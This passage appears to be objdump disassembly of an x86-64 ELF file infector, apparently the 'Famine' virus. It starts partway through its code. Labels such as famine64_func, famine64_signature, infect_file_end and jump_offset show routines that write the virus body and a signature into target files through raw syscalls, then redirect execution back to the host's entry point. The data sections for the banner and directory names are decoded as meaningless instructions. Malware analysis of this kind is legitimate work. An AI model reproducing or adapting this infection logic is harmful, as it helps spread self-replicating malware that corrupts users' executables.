    1a51:	mov    rsi,QWORD PTR [rsp+0x4]
    1a56:	mov    rdx,QWORD PTR [rsp+0x1c]
    1a5b:	syscall 
    1a5d:	mov    eax,0x1
    1a62:	mov    edi,DWORD PTR [rsp]
    1a65:	lea    rsi,[rip+0xfffffffffffff8ec]        # 1358 <famine64_func>
    1a6c:	mov    edx,DWORD PTR [rip+0xaa]        # 1b1c <famine64_size>
    1a72:	sub    edx,0x8
    1a75:	syscall 
    1a77:	mov    eax,0x1
    1a7c:	mov    edi,DWORD PTR [rsp]
    1a7f:	lea    rsi,[rsp+0x14]
    1a84:	mov    edx,0x8
    1a89:	syscall 
    1a8b:	xor    rax,rax
    1a8e:	mov    eax,DWORD PTR [rip+0x88]        # 1b1c <famine64_size>
    1a94:	add    QWORD PTR [rsp+0x1c],rax

0000000000001a99 <write_end>:
    1a99:	mov    eax,0x1
    1a9e:	mov    edi,DWORD PTR [rsp]
    1aa1:	mov    rsi,QWORD PTR [rsp+0x4]
    1aa6:	add    rsi,QWORD PTR [rsp+0x1c]
    1aab:	mov    rdx,QWORD PTR [rsp+0xc]
    1ab0:	sub    rdx,QWORD PTR [rsp+0x1c]
    1ab5:	sub    edx,0x1
    1ab8:	syscall 
    1aba:	mov    eax,0x1
    1abf:	mov    edi,DWORD PTR [rsp]
    1ac2:	lea    rsi,[rip+0xfffffffffffff887]        # 1350 <famine64_signature>
    1ac9:	mov    edx,0x8
    1ace:	syscall 
    1ad0:	mov    eax,0x3
    1ad5:	mov    edi,DWORD PTR [rsp]
    1ad8:	syscall 

0000000000001ada <infect_file_end_add>:
    1ada:	add    rsp,0xbc

0000000000001ae1 <infect_file_end_pop>:
    1ae1:	pop    rbx
    1ae2:	pop    rbp
    1ae3:	pop    r12
    1ae5:	pop    r13
    1ae7:	pop    r14
    1ae9:	pop    r15

0000000000001aeb <infect_file_end>:
    1aeb:	ret    

0000000000001aec <famine64_end>:
    1aec:	cmp    QWORD PTR [rip+0x8b],0x0        # 1b7f <jump_offset>
    1af4:	je     1b04 <no_jump>
    1af6:	lea    rax,[rip+0xfffffffffffff85b]        # 1358 <famine64_func>
    1afd:	add    QWORD PTR [rip+0x7b],rax        # 1b7f <jump_offset>

0000000000001b04 <no_jump>:
    1b04:	add    rsp,0x10
    1b08:	pop    rdi
    1b09:	pop    rax
    1b0a:	cmp    QWORD PTR [rip+0x6d],0x0        # 1b7f <jump_offset>
    1b12:	je     1b1a <do_ret>
    1b14:	push   QWORD PTR [rip+0x65]        # 1b7f <jump_offset>

0000000000001b1a <do_ret>:
    1b1a:	ret    

0000000000001b1b <data>:
	...

0000000000001b1c <famine64_size>:
    1b1c:	/...

0000000000001b20 <banner>:
    1b20:	rex.RX (bad) 
    1b22:	ins    DWORD PTR es:[rdi],dx
    1b23:	imul   ebp,DWORD PTR [rsi+0x65],0x72657620
    1b2a:	jae    1b95 <__libc_csu_init+0x5>
    1b2c:	outs   dx,DWORD PTR ds:[rsi]
    1b2d:	outs   dx,BYTE PTR ds:[rsi]
    1b2e:	and    BYTE PTR [rcx],dh
    1b30:	xor    BYTE PTR cs:[rax],ah
    1b33:	sub    BYTE PTR [rbx+0x29],ah
    1b36:	outs   dx,DWORD PTR ds:[rsi]
    1b37:	fs gs and BYTE PTR fs:[rdx+0x79],ah
    1b3d:	and    BYTE PTR [rdi+0x62],ah
    1b40:	outs   dx,DWORD PTR ds:[rsi]
    1b41:	jne    1bb5 <__libc_csu_init+0x25>
    1b43:	outs   dx,DWORD PTR gs:[esi]
    1b46:	sub    eax,0x78787878
    1b4b:	js     1bc5 <__libc_csu_init+0x35>
    1b4d:	js     1bc7 <__libc_csu_init+0x37>
	...

0000000000001b50 <dir_one>:
    1b50:	(bad)  
    1b51:	je     1bc0 <__libc_csu_init+0x30>
    1b53:	jo     1b84 <jump_offset+0x5>
    1b55:	je     1bbc <__libc_csu_init+0x2c>
    1b57:	jae    1bcd <__libc_csu_init+0x3d>
    1b59:	(bad)  
	...

0000000000001b5b <dir_two>:
    1b5b:	(bad)  
    1b5c:	je     1bcb <__libc_csu_init+0x3b>
    1b5e:	jo     1b8f <end_of_file+0x8>
    1b60:	je     1bc7 <__libc_csu_init+0x37>
    1b62:	jae    1bd8 <__libc_csu_init+0x48>
    1b64:	xor    ch,BYTE PTR [rdi]
	...

0000000000001b67 <dir_all>:
    1b67:	push   rax
    1b68:	sbb    eax,DWORD PTR [rax]
    1b6a:	add    BYTE PTR [rax],al
    1b6c:	add    BYTE PTR [rax],al
    1b6e:	add    BYTE PTR [rbx+0x1b],bl
	...

0000000000001b7f <jump_offset>:
	...

0000000000001b87 <end_of_file>:
    1b87:	nop    WORD PTR [rax+rax*1+0x0]

0000000000001b90 <__libc_csu_init>:
    1b90:	push   r15
    1b92:	push   r14
    1b94:	mov    r15d,edi
    1b97:	push   r13
    1b99:	push   r12
    1b9b:	lea    r12,[rip+0x201216]        # 202db8 <__frame_dummy_init_array_entry>
    1ba2:	push   rbp
    1ba3:	lea    rbp,[rip+0x201216]        # 202dc0 <__init_array_end>
    1baa:	push   rbx
    1bab:	mov    r14,rsi
    1bae:	mov    r13,rdx
    1bb1:	sub    rbp,r12
    1bb4:	sub    rsp,0x8
    1bb8:	sar    rbp,0x3
    1bbc:	call   610 <_init>
    1bc1:	test   rbp,rbp
    1bc4:	je     1be6 <__libc_csu_init+0x56>
    1bc6:	xor    ebx,ebx
    1bc8:	nop    DWORD PTR [rax+rax*1+0x0]
    1bd0:	mov    rdx,r13
    1bd3:	mov    rsi,r14
    1bd6:	mov    edi,r15d
    1bd9:	call   QWORD PTR [r12+rbx*8]
    1bdd:	add    rbx,0x1
    1be1:	cmp    rbp,rbx
    1be4:	jne    1bd0 <__libc_csu_init+0x40>
    1be6:	add    rsp,0x8
    1bea:	pop    rbx
    1beb:	pop    rbp
    1bec:	pop    r12
    1bee:	pop    r13
    1bf0:	pop    r14
    1bf2:	pop    r15
    1bf4:	ret    
    1bf5:	nop
    1bf6:	nop    WORD PTR cs:[rax+rax*1+0x0]

0000000000001c00 <__libc_csu_fini>:
    1c00:	repz ret 

Disassembly of section .fini:

0000000000001c04 <_fini>:
    1c04:	sub    rsp,0x8
    1c08:	add    rsp,0x8
    1c0c:	ret    
